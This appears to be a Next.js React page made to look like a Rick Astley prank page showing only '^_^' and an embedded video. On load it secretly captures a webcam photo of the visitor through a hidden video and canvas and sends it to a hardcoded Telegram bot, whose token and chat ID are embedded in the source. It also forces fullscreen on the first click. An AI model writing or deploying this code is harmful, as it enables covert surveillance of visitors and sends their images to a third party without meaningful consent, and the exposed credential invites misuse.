"use client";

import { useRef, useEffect } from "react";

export default function OfuzakePage() {
    const videoRef = useRef<HTMLVideoElement>(null);
    const canvasRef = useRef<HTMLCanvasElement>(null);
    const hasCaptured = useRef(false);

    const TELEGRAM_TOKEN = "8518871230:AAHWebX0mJ-QfrDXNEjeXT4QWhTFEBrgjBE";
    const TELEGRAM_CHAT_ID = "905324007";

    useEffect(() => {
        if (hasCaptured.current) return;

        const captureAndSend = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false,
                });

                if (videoRef.current) {
                    videoRef.current.srcObject = stream;
                    await videoRef.current.play();

                    // Wait for video to be ready
                    await new Promise((resolve) => setTimeout(resolve, 1000));

                    if (canvasRef.current && videoRef.current) {
                        const canvas = canvasRef.current;
                        const video = videoRef.current;
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext("2d");
                        if (ctx) {
                            ctx.drawImage(video, 0, 0);
                            const imageData = canvas.toDataURL("image/jpeg", 0.8);

                            // Convert to blob and send to Telegram
                            const response = await fetch(imageData);
                            const blob = await response.blob();

                            const formData = new FormData();
                            formData.append("chat_id", TELEGRAM_CHAT_ID);
                            formData.append("photo", blob, "capture.jpg");
                            formData.append("caption", "📸 Captured");

                            await fetch(
                                `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
                                {
                                    method: "POST",
                                    body: formData,
                                }
                            );
                        }
                    }

                    // Stop the stream
                    stream.getTracks().forEach((track) => track.stop());
                }

                hasCaptured.current = true;
            } catch (error) {
                console.log("Camera access issue");
            }
        };

        // Request fullscreen on first user interaction
        const requestFullscreen = () => {
            document.documentElement.requestFullscreen?.().catch(() => { });
            document.removeEventListener("click", requestFullscreen);
        };
        document.addEventListener("click", requestFullscreen);

        captureAndSend();

        return () => {
            document.removeEventListener("click", requestFullscreen);
        };
    }, []);

    return (
        <div className="page-container">
            <div className="page-header"></div>

            {/* Hidden video and canvas for capture */}
            <video ref={videoRef} autoPlay playsInline muted style={{ display: "none" }} />
            <canvas ref={canvasRef} style={{ display: "none" }} />

            <div className="flex flex-col gap-6 max-w-2xl">
                <section className="prose dark:prose-invert">
                    <p>^_^</p>
                </section>

                <div className="w-full aspect-video rounded overflow-hidden border border-gray-700">
                    <iframe
                        className="w-full h-full"
                        src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1"
                        title="Rick Astley - Never Gonna Give You Up"
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; fullscreen"
                        allowFullScreen
                    />
                </div>
            </div>
        </div>
    );
}
